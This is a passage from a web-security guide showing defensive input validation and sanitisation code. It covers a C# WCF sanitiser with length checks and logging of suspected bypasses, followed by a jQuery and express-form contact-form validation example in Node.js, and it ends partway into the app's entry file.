<code class="lineno">121 </code>               <code class="s">"\""</code> <code class="p">+</code> <code class="n">RequestingIpAddress</code> <code class="p">+</code> <code class="s">"\" "</code> <code class="p">+</code>
<code class="lineno">122 </code>               <code class="s">"had characters that failed to match the whitelist."</code><code class="p">;</code>
<code class="lineno">123 </code>            <code class="k">throw</code> <code class="k">new</code> <code class="nf">SanitisationWcfException</code><code class="p">(</code><code class="n">error</code><code class="p">);</code>
<code class="lineno">124 </code>         <code class="p">}</code>
<code class="lineno">125 </code>       
<code class="lineno">126 </code>         <code class="kt">int</code> <code class="n">numberOfEscapes</code> <code class="p">=</code> <code class="m">0</code><code class="p">;</code>
<code class="lineno">127 </code>         <code class="kt">string</code> <code class="n">sanitisedUserInput</code> <code class="p">=</code> <code class="n">decodedUserInput</code><code class="p">.</code><code class="n">HtmlEncode</code><code class="p">(</code><code class="k">ref</code> <code class="n">numberOfEscapes</code><code class="p">);</code>
<code class="lineno">128 </code>       
<code class="lineno">129 </code>         <code class="k">if</code><code class="p">(</code><code class="n">numberOfEscapes</code> <code class="p">!=</code> <code class="n">numberOfDecodedHtmlEntities</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">130 </code>            <code class="n">AsyncLogAndEmail</code><code class="p">(</code><code class="n">sanitiseMe</code><code class="p">,</code> <code class="n">sanitisedUserInput</code><code class="p">);</code>
<code class="lineno">131 </code>         <code class="p">}</code>
<code class="lineno">132 </code>       
<code class="lineno">133 </code>         <code class="k">return</code> <code class="n">sanitisedUserInput</code><code class="p">;</code>
<code class="lineno">134 </code>      <code class="p">}</code>
<code class="lineno">135 </code>
<code class="lineno">136 </code>      <code class="c1">/// &lt;note&gt;</code>
<code class="lineno">137 </code>      <code class="c1">/// Make sure the logger is setup to log asynchronously</code>
<code class="lineno">138 </code>      <code class="c1">/// &lt;/note&gt;</code>
<code class="lineno">139 </code>      <code class="k">private</code> <code class="k">void</code> <code class="nf">AsyncLogAndEmail</code><code class="p">(</code><code class="kt">string</code> <code class="n">sanitiseMe</code><code class="p">,</code> <code class="kt">string</code> <code class="n">sanitisedUserInput</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">140 </code>         <code class="c1">// no need for SanitisationException    </code>
<code class="lineno">141 </code>
<code class="lineno">142 </code>         <code class="n">_logger</code><code class="p">.</code><code class="n">logError</code><code class="p">(</code>
<code class="lineno">143 </code>            <code class="s">"It appears as if someone has circumvented the client side "</code> <code class="p">+</code>
<code class="lineno">144 </code>            <code class="s">"Html entity encoding."</code> <code class="p">+</code>
<code class="lineno">145 </code>            <code class="n">Environment</code><code class="p">.</code><code class="n">NewLine</code> <code class="p">+</code>
<code class="lineno">146 </code>            <code class="s">"The requesting IP address was: "</code> <code class="p">+</code>
<code class="lineno">147 </code>            <code class="s">"\""</code> <code class="p">+</code> <code class="n">RequestingIpAddress</code> <code class="p">+</code> <code class="s">"\" "</code> <code class="p">+</code>
<code class="lineno">148 </code>            <code class="s">"The sanitised input we receive from the client was the following:"</code> <code class="p">+</code>
<code class="lineno">149 </code>            <code class="n">Environment</code><code class="p">.</code><code class="n">NewLine</code> <code class="p">+</code>
<code class="lineno">150 </code>            <code class="s">"\""</code> <code class="p">+</code> <code class="n">sanitiseMe</code> <code class="p">+</code> <code class="s">"\""</code> <code class="p">+</code>
<code class="lineno">151 </code>            <code class="n">Environment</code><code class="p">.</code><code class="n">NewLine</code> <code class="p">+</code>
<code class="lineno">152 </code>            <code class="s">"The same input after decoding and re-escaping on the "</code> <code class="p">+</code>
<code class="lineno">153 </code>            <code class="s">"server side was the following:"</code> <code class="p">+</code>
<code class="lineno">154 </code>            <code class="n">Environment</code><code class="p">.</code><code class="n">NewLine</code> <code class="p">+</code>
<code class="lineno">155 </code>            <code class="s">"\""</code> <code class="p">+</code> <code class="n">sanitisedUserInput</code> <code class="p">+</code> <code class="s">"\""</code>
<code class="lineno">156 </code>         <code class="p">);</code>
<code class="lineno">157 </code>      <code class="p">}</code>
<code class="lineno">158 </code>
<code class="lineno">159 </code>      <code class="c1">/// &lt;summary&gt;</code>
<code class="lineno">160 </code>      <code class="c1">/// This procedure may throw a SanitisationWcfException.</code>
<code class="lineno">161 </code>      <code class="c1">/// If it does, ErrorHandlerBehaviorAttribute will need to pass the</code>
<code class="lineno">162 </code>      <code class="c1">/// "messageForClient" back to the client from within the</code>
<code class="lineno">163 </code>      <code class="c1">/// IErrorHandler.ProvideFault procedure.</code>
<code class="lineno">164 </code>      <code class="c1">/// Once execution is returned,</code>
<code class="lineno">165 </code>      <code class="c1">/// the IErrorHandler.HandleError procedure of ErrorHandlerBehaviorAttribute</code>
<code class="lineno">166 </code>      <code class="c1">/// will continue to process the exception that was thrown in the way of</code>
<code class="lineno">167 </code>      <code class="c1">/// logging sensitive info.</code>
<code class="lineno">168 </code>      <code class="c1">/// &lt;/summary&gt;</code>
<code class="lineno">169 </code>      <code class="c1">/// &lt;param name="toSanitise"&gt;&lt;/param&gt;</code>
<code class="lineno">170 </code>      <code class="k">private</code> <code class="k">void</code> <code class="nf">ThrowExceptionIfEscapedInputToLong</code><code class="p">(</code><code class="kt">string</code> <code class="n">toSanitise</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">171 </code>         <code class="kt">int</code> <code class="n">maxLengthHtmlEncodedUserInput</code> <code class="p">=</code>
<code class="lineno">172 </code>            <code class="kt">int</code><code class="p">.</code><code class="n">Parse</code><code class="p">(</code><code class="n">ConfigurationManager</code><code class="p">.</code><code class="n">AppSettings</code><code class="p">[</code><code class="s">"MaxLengthHtmlEncodedUserInput"</code><code class="p">]);</code>
<code class="lineno">173 </code>         <code class="k">if</code> <code class="p">(</code><code class="n">toSanitise</code><code class="p">.</code><code class="n">Length</code> <code class="p">&gt;</code> <code class="n">maxLengthHtmlEncodedUserInput</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">174 </code>            <code class="kt">string</code> <code class="n">error</code> <code class="p">=</code>
<code class="lineno">175 </code>               <code class="s">"The un-modified string received from the client "</code> <code class="p">+</code>
<code class="lineno">176 </code>               <code class="s">"with the following IP address: "</code> <code class="p">+</code>
<code class="lineno">177 </code>               <code class="s">"\""</code> <code class="p">+</code> <code class="n">RequestingIpAddress</code> <code class="p">+</code> <code class="s">"\" "</code> <code class="p">+</code>
<code class="lineno">178 </code>               <code class="s">"exceeded the allowed maximum length of "</code> <code class="p">+</code>
<code class="lineno">179 </code>               <code class="s">"an escaped Html user input string. "</code> <code class="p">+</code>
<code class="lineno">180 </code>               <code class="s">"The maximum length allowed is: "</code> <code class="p">+</code>
<code class="lineno">181 </code>               <code class="n">maxLengthHtmlEncodedUserInput</code> <code class="p">+</code>
<code class="lineno">182 </code>               <code class="s">". The length was: "</code> <code class="p">+</code>
<code class="lineno">183 </code>               <code class="n">toSanitise</code><code class="p">.</code><code class="n">Length</code> <code class="p">+</code> <code class="s">"."</code><code class="p">;</code>
<code class="lineno">184 </code>            <code class="k">throw</code> <code class="k">new</code> <code class="nf">SanitisationWcfException</code><code class="p">(</code><code class="n">error</code><code class="p">,</code> <code class="n">unsanitisedAnswer</code><code class="p">:</code> <code class="n">toSanitise</code><code class="p">);</code>
<code class="lineno">185 </code>         <code class="p">}</code>
<code class="lineno">186 </code>      <code class="p">}</code>
<code class="lineno">187 </code>
<code class="lineno">188 </code>      <code class="k">private</code> <code class="kt">string</code> <code class="nf">HtmlDecodeUserInput</code><code class="p">(</code>
<code class="lineno">189 </code>         <code class="kt">string</code> <code class="n">doubleEncodedUserInput</code><code class="p">,</code>
<code class="lineno">190 </code>         <code class="k">ref</code> <code class="kt">int</code> <code class="n">numberOfDecodedHtmlEntities</code>
<code class="lineno">191 </code>      <code class="p">)</code> <code class="p">{</code>
<code class="lineno">192 </code>         <code class="kt">string</code> <code class="n">decodedUserInput</code> <code class="p">=</code>
<code class="lineno">193 </code>            <code class="n">doubleEncodedUserInput</code><code class="p">.</code><code class="n">HtmlDecode</code><code class="p">(</code>
<code class="lineno">194 </code>               <code class="k">ref</code> <code class="n">numberOfDecodedHtmlEntities</code>
<code class="lineno">195 </code>            <code class="p">).</code><code class="n">HtmlDecode</code><code class="p">(</code><code class="k">ref</code> <code class="n">numberOfDecodedHtmlEntities</code><code class="p">)</code> <code class="p">??</code>
<code class="lineno">196 </code>            <code class="kt">string</code><code class="p">.</code><code class="n">Empty</code><code class="p">;</code>
<code class="lineno">197 </code>         
<code class="lineno">198 </code>         <code class="c1">// if the decoded string is longer than MaxLengthHtmlDecodedUserInput throw</code>
<code class="lineno">199 </code>         <code class="kt">int</code> <code class="n">maxLengthHtmlDecodedUserInput</code> <code class="p">=</code>
<code class="lineno">200 </code>            <code class="kt">int</code><code class="p">.</code><code class="n">Parse</code><code class="p">(</code><code class="n">ConfigurationManager</code><code class="p">.</code><code class="n">AppSettings</code><code class="p">[</code><code class="s">"MaxLengthHtmlDecodedUserInput"</code><code class="p">]);</code>
<code class="lineno">201 </code>         <code class="k">if</code><code class="p">(</code><code class="n">decodedUserInput</code><code class="p">.</code><code class="n">Length</code> <code class="p">&gt;</code> <code class="n">maxLengthHtmlDecodedUserInput</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">202 </code>            <code class="k">throw</code> <code class="k">new</code> <code class="nf">SanitisationWcfException</code><code class="p">(</code>
<code class="lineno">203 </code>               <code class="s">"The string received from the client with the following IP address: "</code> <code class="p">+</code>
<code class="lineno">204 </code>               <code class="s">"\""</code> <code class="p">+</code> <code class="n">RequestingIpAddress</code> <code class="p">+</code> <code class="s">"\" "</code> <code class="p">+</code>
<code class="lineno">205 </code>               <code class="s">"after Html decoding exceded the allowed maximum length "</code> <code class="p">+</code>
<code class="lineno">206 </code>               <code class="s">"of an un-escaped Html user input string."</code> <code class="p">+</code>
<code class="lineno">207 </code>               <code class="n">Environment</code><code class="p">.</code><code class="n">NewLine</code> <code class="p">+</code>
<code class="lineno">208 </code>               <code class="s">"The maximum length allowed is: "</code> <code class="p">+</code>
<code class="lineno">209 </code>               <code class="n">maxLengthHtmlDecodedUserInput</code> <code class="p">+</code>
<code class="lineno">210 </code>               <code class="s">". The length was: "</code> <code class="p">+</code>
<code class="lineno">211 </code>               <code class="n">decodedUserInput</code><code class="p">.</code><code class="n">Length</code> <code class="p">+</code> <code class="s">"."</code><code class="p">,</code>
<code class="lineno">212 </code>               <code class="n">unsanitisedAnswer</code><code class="p">:</code> <code class="n">doubleEncodedUserInput</code>
<code class="lineno">213 </code>            <code class="p">);</code>
<code class="lineno">214 </code>         <code class="p">}</code>
<code class="lineno">215 </code>         <code class="k">return</code> <code class="n">decodedUserInput</code><code class="p">;</code>
<code class="lineno">216 </code>      <code class="p">}</code>
<code class="lineno">217 </code>   <code class="p">}</code>
<code class="lineno">218 </code><code class="p">}</code>
</pre></div>

</figure>

<p>As you can see, there is a lot more work on the server side than the client side.</p>

<h6 id="web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-nodejs">Example in JavaScript and NodeJS</h6>

<aside>

  <p>Without sanitisation, things are a lot simpler.</p>


</aside>

<p>For the next example we use a single page app. Switching to <code>jQuery.validator</code> on the client side and <code>express-form</code> on the server side. Our example is a simple contact form. I have only shown the parts relevant to validation and filtering.</p>

<p>Once the jQuery plugin (which is a module) <code>validate</code> is loaded, jQuery is passed to it. The plugin extends the jQuery prototype with its <code>validate</code> method. Our contact.js script then loads in the browser. We then call <code>ContactForm.initContactForm();</code>. ContactForm is immediately invoked and returns an object, of which we call <code>initContactForm()</code> on.</p>

<p>We add a custom validation function to our <code>validator</code> by way of <code>addMethod</code>. This function will take the value being tested, the element itself and a regular expression to test against. You can see we use this function when we pass our rules within the <code>options</code> object to <code>validate</code> which internally passes them to its <code>validator</code>.</p>

<p>The <code>validate</code> documentation explains the sequence of events that your custom rules will be applied in.</p>

<p>We pass <code>options</code> containing:</p>

<ul>
  <li><code>rules</code></li>
  <li><code>messages</code></li>
  <li>
<code>submitHandler</code> which is bound to the native <code>submit</code> event</li>
</ul>

<p>There are many other options you can provide. I think the code is fairly self explanatory:</p>

<figure class="code">
  <figcaption>contact.js</figcaption>

<div class="highlight"><pre><code></code><code class="kd">var</code> <code class="nx">ContactForm</code> <code class="o">=</code> <code class="kd">function</code> <code class="p">()</code> <code class="p">{</code>

   <code class="k">return</code> <code class="p">{</code>

      <code class="c1">//Contact Form</code>
      <code class="nx">initContactForm</code><code class="o">:</code> <code class="kd">function</code> <code class="p">()</code> <code class="p">{</code>
         <code class="c1">// Validation</code>
         <code class="nx">$</code><code class="p">.</code><code class="nx">validator</code><code class="p">.</code><code class="nx">addMethod</code><code class="p">(</code><code class="s1">'fieldValidated'</code><code class="p">,</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">value</code><code class="p">,</code> <code class="nx">element</code><code class="p">,</code> <code class="nx">regexpr</code><code class="p">)</code> <code class="p">{</code>
            <code class="k">return</code> <code class="nx">regexpr</code><code class="p">.</code><code class="nx">test</code><code class="p">(</code><code class="nx">value</code><code class="p">);</code>
         <code class="p">},</code>
         <code class="s1">'No dodgy characters thanks.'</code><code class="p">);</code>
         <code class="nx">$</code><code class="p">(</code><code class="s2">"#sky-form3"</code><code class="p">).</code><code class="nx">validate</code><code class="p">({</code>
            <code class="c1">// Rules for form validation</code>
            <code class="nx">rules</code><code class="o">:</code> <code class="p">{</code>
               <code class="nx">name</code><code class="o">:</code> <code class="p">{</code>
                  <code class="nx">required</code><code class="o">:</code> <code class="kc">true</code><code class="p">,</code>
                  <code class="nx">minlength</code><code class="o">:</code> <code class="mi">2</code><code class="p">,</code>
                  <code class="nx">maxlength</code><code class="o">:</code> <code class="mi">50</code><code class="p">,</code>
                  <code class="nx">fieldValidated</code><code class="o">:</code> <code class="sr">/^[a-zA-Z ']+$/</code>
               <code class="p">},</code>
               <code class="nx">email</code><code class="o">:</code> <code class="p">{</code>
                  <code class="nx">required</code><code class="o">:</code> <code class="kc">true</code><code class="p">,</code>
                  <code class="nx">email</code><code class="o">:</code> <code class="kc">true</code>
               <code class="p">},</code>
               <code class="nx">message</code><code class="o">:</code> <code class="p">{</code>
                  <code class="nx">required</code><code class="o">:</code> <code class="kc">true</code><code class="p">,</code>
                  <code class="nx">minlength</code><code class="o">:</code> <code class="mi">10</code><code class="p">,</code>
                  <code class="nx">maxlength</code><code class="o">:</code> <code class="mi">1000</code><code class="p">,</code>
                  <code class="nx">fieldValidated</code><code class="o">:</code> <code class="sr">/^[a-zA-Z0-9-_ \?.,]+$/</code>
               <code class="p">}</code>
            <code class="p">},</code>

            <code class="c1">// Messages for form validation</code>
            <code class="nx">messages</code><code class="o">:</code> <code class="p">{</code>
               <code class="nx">name</code><code class="o">:</code> <code class="p">{</code>
                  <code class="nx">required</code><code class="o">:</code> <code class="s1">'Please enter your name'</code>
               <code class="p">},</code>
               <code class="nx">email</code><code class="o">:</code> <code class="p">{</code>
                  <code class="nx">required</code><code class="o">:</code> <code class="s1">'Please enter your email address'</code><code class="p">,</code>
                  <code class="nx">email</code><code class="o">:</code> <code class="s1">'Please enter a VALID email address'</code>
               <code class="p">},</code>
               <code class="nx">message</code><code class="o">:</code> <code class="p">{</code>
                  <code class="nx">required</code><code class="o">:</code> <code class="s1">'Please enter your message'</code>
               <code class="p">}</code>
            <code class="p">},</code>

            <code class="c1">// Ajax form submition. For details see jQuery Form Plugin:</code>
            <code class="c1">// http://malsup.com/jquery/form/</code>
            <code class="nx">submitHandler</code><code class="o">:</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">form</code><code class="p">)</code> <code class="p">{</code>
               <code class="nx">$</code><code class="p">(</code><code class="nx">form</code><code class="p">).</code><code class="nx">ajaxSubmit</code><code class="p">({</code>
                  <code class="nx">beforeSend</code><code class="o">:</code> <code class="kd">function</code> <code class="p">()</code> <code class="p">{</code>
                     <code class="c1">// Useful for doing things like adding wait spinners</code>
                     <code class="c1">// or any work you want to do before sending.</code>
                     <code class="c1">// Todo: I think we need a wait spinner here.</code>
                  <code class="p">},</code>
                  <code class="c1">// type: 'POST' // Default;</code>
                  <code class="nx">dataType</code><code class="o">:</code> <code class="s1">'json'</code><code class="p">,</code>
                  <code class="nx">success</code><code class="o">:</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">responseText</code><code class="p">,</code> <code class="nx">statusText</code><code class="p">)</code> <code class="p">{</code>
                     <code class="c1">// Handle success</code>
                  <code class="p">},</code>
                  <code class="nx">error</code><code class="o">:</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">error</code><code class="p">)</code> <code class="p">{</code>
                     <code class="c1">// Handle error</code>
                  <code class="p">}</code>
               <code class="p">});</code>
            <code class="p">},</code>

            <code class="c1">// Do not change code below</code>
            <code class="nx">errorPlacement</code><code class="o">:</code> <code class="kd">function</code><code class="p">(</code><code class="nx">error</code><code class="p">,</code> <code class="nx">element</code><code class="p">)</code> <code class="p">{</code>
               <code class="nx">error</code><code class="p">.</code><code class="nx">insertAfter</code><code class="p">(</code><code class="nx">element</code><code class="p">.</code><code class="nx">parent</code><code class="p">());</code>
            <code class="p">}</code>
         <code class="p">});</code>
      <code class="p">}</code>
   <code class="p">};</code>
<code class="p">}();</code>
</pre></div>

</figure>

<p>Shifting our attention to the server side now. First up we have got the home route of the single page app. Within the home route, we have also got the <code>/contact</code> route which uses the <code>express-form</code> middleware. You can see the middleware first in action on line 82.</p>

<figure class="code">
  <figcaption>routes/home.js</figcaption>

<div class="highlight"><pre><code></code><code class="lineno"> 1 </code><code class="kd">var</code> <code class="nx">logger</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'../util/logger'</code><code class="p">);</code>
<code class="lineno"> 2 </code><code class="kd">var</code> <code class="nx">form</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'express-form'</code><code class="p">);</code>
<code class="lineno"> 3 </code><code class="kd">var</code> <code class="nx">fieldToValidate</code> <code class="o">=</code> <code class="nx">form</code><code class="p">.</code><code class="nx">field</code><code class="p">;</code>
<code class="lineno"> 4 </code><code class="kd">var</code> <code class="nx">os</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'os'</code><code class="p">);</code>    
<code class="lineno"> 5 </code>
<code class="lineno"> 6 </code><code class="kd">function</code> <code class="nx">home</code><code class="p">(</code><code class="nx">req</code><code class="p">,</code> <code class="nx">res</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno"> 7 </code>   <code class="nx">res</code><code class="p">.</code><code class="nx">redirect</code><code class="p">(</code><code class="s1">'/'</code><code class="p">);</code>
<code class="lineno"> 8 </code><code class="p">}</code>
<code class="lineno"> 9 </code>
<code class="lineno">10 </code><code class="kd">function</code> <code class="nx">index</code><code class="p">(</code><code class="nx">req</code><code class="p">,</code> <code class="nx">res</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">11 </code>   <code class="nx">res</code><code class="p">.</code><code class="nx">render</code><code class="p">(</code><code class="s1">'home'</code><code class="p">,</code> <code class="p">{</code> <code class="nx">title</code><code class="o">:</code> <code class="s1">'Home'</code><code class="p">,</code> <code class="nx">id</code><code class="o">:</code> <code class="s1">'home'</code><code class="p">,</code> <code class="nx">brand</code><code class="o">:</code> <code class="s1">'your brand'</code> <code class="p">});</code>
<code class="lineno">12 </code><code class="p">}</code>
<code class="lineno">13 </code>
<code class="lineno">14 </code><code class="kd">function</code> <code class="nx">validate</code><code class="p">()</code> <code class="p">{</code>
<code class="lineno">15 </code>   <code class="k">return</code> <code class="nx">form</code><code class="p">(</code>
<code class="lineno">16 </code>      <code class="c1">// trim is filtering. toBoolean is some simple sanitisation. The rest is validation.</code>
<code class="lineno">17 </code>      <code class="nx">fieldToValidate</code><code class="p">(</code><code class="s1">'name'</code><code class="p">).</code>
<code class="lineno">18 </code>         <code class="nx">trim</code><code class="p">().</code>
<code class="lineno">19 </code>         <code class="nx">required</code><code class="p">().</code>
<code class="lineno">20 </code>         <code class="nx">minLength</code><code class="p">(</code><code class="mi">2</code><code class="p">).</code>
<code class="lineno">21 </code>         <code class="nx">maxLength</code><code class="p">(</code><code class="mi">50</code><code class="p">).</code>
<code class="lineno">22 </code>         <code class="nx">is</code><code class="p">(</code><code class="sr">/^[a-zA-Z ']+$/</code><code class="p">),</code> <code class="c1">// Regex same as cleint side.</code>
<code class="lineno">23 </code>      <code class="nx">fieldToValidate</code><code class="p">(</code><code class="s1">'email'</code><code class="p">).</code>
<code class="lineno">24 </code>         <code class="nx">trim</code><code class="p">().</code>
<code class="lineno">25 </code>         <code class="nx">required</code><code class="p">().</code>
<code class="lineno">26 </code>         <code class="nx">isEmail</code><code class="p">(),</code>
<code class="lineno">27 </code>      <code class="nx">fieldToValidate</code><code class="p">(</code><code class="s1">'message'</code><code class="p">).</code>
<code class="lineno">28 </code>         <code class="nx">trim</code><code class="p">().</code>
<code class="lineno">29 </code>         <code class="nx">required</code><code class="p">().</code>
<code class="lineno">30 </code>         <code class="nx">minLength</code><code class="p">(</code><code class="mi">10</code><code class="p">).</code>
<code class="lineno">31 </code>         <code class="nx">maxLength</code><code class="p">(</code><code class="mi">1000</code><code class="p">).</code>
<code class="lineno">32 </code>         <code class="nx">is</code><code class="p">(</code><code class="sr">/^[a-zA-Z0-9-_ \?.,]+$/</code><code class="p">),</code> <code class="c1">// Regex same as cleint side.</code>
<code class="lineno">33 </code>      <code class="nx">fieldToValidate</code><code class="p">(</code><code class="s1">'subscribe-to-mailing-list'</code><code class="p">).</code><code class="nx">toBoolean</code><code class="p">(),</code>
<code class="lineno">34 </code>      <code class="c1">// I discuss the next line of code as part of a solution to what</code>
<code class="lineno">35 </code>      <code class="c1">// captchas are trying to solve below in the Captcha section.</code>
<code class="lineno">36 </code>      <code class="c1">// Bots love to populate everything.</code>
<code class="lineno">37 </code>      <code class="nx">fieldToValidate</code><code class="p">(</code><code class="s1">'bot-pot'</code><code class="p">).</code><code class="nx">maxLength</code><code class="p">(</code><code class="mi">0</code><code class="p">)</code>
<code class="lineno">38 </code>   <code class="p">);</code>
<code class="lineno">39 </code><code class="p">}</code>
<code class="lineno">40 </code>
<code class="lineno">41 </code><code class="c1">// Using express-form: req.form is the validated req.body</code>
<code class="lineno">42 </code><code class="kd">function</code> <code class="nx">contact</code><code class="p">(</code><code class="nx">req</code><code class="p">,</code> <code class="nx">res</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">43 </code>   
<code class="lineno">44 </code>   <code class="k">if</code><code class="p">(</code><code class="nx">req</code><code class="p">.</code><code class="nx">form</code><code class="p">.</code><code class="nx">isValid</code><code class="p">)</code>
<code class="lineno">45 </code>      <code class="nx">sendEmail</code><code class="p">(</code><code class="nx">req</code><code class="p">,</code> <code class="nx">res</code><code class="p">);</code>
<code class="lineno">46 </code>   <code class="k">else</code> <code class="p">{</code>
<code class="lineno">47 </code>      <code class="p">(</code><code class="kd">function</code> <code class="nx">alertEmail</code><code class="p">()</code> <code class="p">{</code>
<code class="lineno">48 </code>         <code class="kd">var</code> <code class="nx">reqBody</code> <code class="o">=</code>
<code class="lineno">49 </code>            <code class="s1">'Body of contact request (server-side unvalidated): '</code> <code class="o">+</code>
<code class="lineno">50 </code>            <code class="nx">JSON</code><code class="p">.</code><code class="nx">stringify</code><code class="p">(</code><code class="nx">req</code><code class="p">.</code><code class="nx">body</code><code class="p">);</code>
<code class="lineno">51 </code>         <code class="kd">var</code> <code class="nx">reqForm</code> <code class="o">=</code>
<code class="lineno">52 </code>            <code class="s1">'Form of contact request (server-side validated): '</code> <code class="o">+</code>
<code class="lineno">53 </code>            <code class="nx">JSON</code><code class="p">.</code><code class="nx">stringify</code><code class="p">(</code><code class="nx">req</code><code class="p">.</code><code class="nx">form</code><code class="p">);</code>
<code class="lineno">54 </code>         <code class="kd">var</code> <code class="nx">validationErrors</code> <code class="o">=</code>
<code class="lineno">55 </code>            <code class="s1">'Errors produced by express-form validation: '</code> <code class="o">+</code>
<code class="lineno">56 </code>            <code class="nx">req</code><code class="p">.</code><code class="nx">form</code><code class="p">.</code><code class="nx">errors</code><code class="p">;</code>
<code class="lineno">57 </code>         <code class="kd">var</code> <code class="nx">details</code> <code class="o">=</code>
<code class="lineno">58 </code>            <code class="nx">os</code><code class="p">.</code><code class="nx">EOL</code> <code class="o">+</code>
<code class="lineno">59 </code>            <code class="nx">reqBody</code> <code class="o">+</code>
<code class="lineno">60 </code>            <code class="nx">os</code><code class="p">.</code><code class="nx">EOL</code> <code class="o">+</code>
<code class="lineno">61 </code>            <code class="nx">os</code><code class="p">.</code><code class="nx">EOL</code> <code class="o">+</code>
<code class="lineno">62 </code>            <code class="nx">reqForm</code> <code class="o">+</code>
<code class="lineno">63 </code>            <code class="nx">os</code><code class="p">.</code><code class="nx">EOL</code> <code class="o">+</code>
<code class="lineno">64 </code>            <code class="nx">os</code><code class="p">.</code><code class="nx">EOL</code> <code class="o">+</code>
<code class="lineno">65 </code>            <code class="nx">validationErrors</code> <code class="o">+</code>
<code class="lineno">66 </code>            <code class="nx">os</code><code class="p">.</code><code class="nx">EOL</code><code class="p">;</code>
<code class="lineno">67 </code>         <code class="c1">// Logger.emailLoggerFailure shown in the Insufficient Logging section</code>
<code class="lineno">68 </code>         <code class="nx">logger</code><code class="p">.</code><code class="nx">crit</code><code class="p">(</code>
<code class="lineno">69 </code>            <code class="s1">''</code><code class="p">,</code>
<code class="lineno">70 </code>            <code class="s1">'Validation error for my website contact form. '</code><code class="p">,</code>
<code class="lineno">71 </code>            <code class="p">{</code><code class="nx">details</code><code class="o">:</code> <code class="nx">details</code><code class="p">},</code>
<code class="lineno">72 </code>            <code class="nx">logger</code><code class="p">.</code><code class="nx">emailLoggerFailure</code>
<code class="lineno">73 </code>         <code class="p">);</code>
<code class="lineno">74 </code>      <code class="p">}());</code>
<code class="lineno">75 </code>      <code class="nx">res</code><code class="p">.</code><code class="nx">status</code><code class="p">(</code><code class="mi">418</code><code class="p">).</code><code class="nx">send</code><code class="p">({</code><code class="nx">error</code><code class="o">:</code> <code class="s1">'User input was not valid. Try teliporting instead.'</code><code class="p">});</code>
<code class="lineno">76 </code>   <code class="p">}</code>
<code class="lineno">77 </code><code class="p">}</code>
<code class="lineno">78 </code>
<code class="lineno">79 </code><code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">app</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">80 </code>   <code class="nx">app</code><code class="p">.</code><code class="nx">get</code><code class="p">(</code><code class="s1">'/'</code><code class="p">,</code> <code class="nx">index</code><code class="p">);</code>
<code class="lineno">81 </code>   <code class="nx">app</code><code class="p">.</code><code class="nx">get</code><code class="p">(</code><code class="s1">'/home'</code><code class="p">,</code> <code class="nx">home</code><code class="p">);</code> 
<code class="lineno">82 </code>   <code class="nx">app</code><code class="p">.</code><code class="nx">post</code><code class="p">(</code><code class="s1">'/contact'</code><code class="p">,</code> <code class="nx">validate</code><code class="p">(),</code> <code class="nx">contact</code><code class="p">);</code>
<code class="lineno">83 </code><code class="p">};</code>
</pre></div>

</figure>

<p>Following is the routing module that loads all other routes</p>

<figure class="code">
  <figcaption>routes/index.js</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// This module loads dynamically all routes modules located in the routes/ directory.</code>
 
<code class="s1">'use strict'</code><code class="p">;</code>
<code class="kd">var</code> <code class="nx">fs</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'fs'</code><code class="p">);</code>
<code class="kd">var</code> <code class="nx">path</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'path'</code><code class="p">);</code>

<code class="nx">module</code><code class="p">.</code><code class="nx">exports</code> <code class="o">=</code> <code class="kd">function</code> <code class="p">(</code><code class="nx">app</code><code class="p">)</code> <code class="p">{</code>
   <code class="nx">fs</code><code class="p">.</code><code class="nx">readdirSync</code><code class="p">(</code><code class="nx">path</code><code class="p">.</code><code class="nx">join</code><code class="p">(</code><code class="nx">__dirname</code><code class="p">)).</code><code class="nx">forEach</code><code class="p">(</code><code class="kd">function</code> <code class="p">(</code><code class="nx">file</code><code class="p">)</code> <code class="p">{</code>
      <code class="c1">// Avoid to read this current file.</code>
      <code class="k">if</code> <code class="p">(</code><code class="nx">file</code> <code class="o">===</code> <code class="nx">path</code><code class="p">.</code><code class="nx">basename</code><code class="p">(</code><code class="nx">__filename</code><code class="p">))</code> <code class="p">{</code> <code class="k">return</code><code class="p">;</code> <code class="p">}</code>

      <code class="c1">// Load the route file.</code>
      <code class="nx">require</code><code class="p">(</code><code class="s1">'./'</code> <code class="o">+</code> <code class="nx">file</code><code class="p">)(</code><code class="nx">app</code><code class="p">);</code>
   <code class="p">});</code>
<code class="p">};</code>
</pre></div>

</figure>

<p>Now our entry point into the application. We load routes on line 30.</p>

<figure class="code">
  <figcaption>app.js</figcaption>

<div class="highlight"><pre><code></code><code class="lineno"> 1 </code><code class="kd">var</code> <code class="nx">http</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'http'</code><code class="p">);</code>
<code class="lineno"> 2 </code><code class="kd">var</code> <code class="nx">express</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'express'</code><code class="p">);</code>
<code class="lineno"> 3 </code><code class="kd">var</code> <code class="nx">path</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'path'</code><code class="p">);</code>
<code class="lineno"> 4 </code><code class="kd">var</code> <code class="nx">morganLogger</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'morgan'</code><code class="p">);</code>
<code class="lineno"> 5 </code><code class="c1">// Due to bug in node-config the next line is needed before config is required.</code>
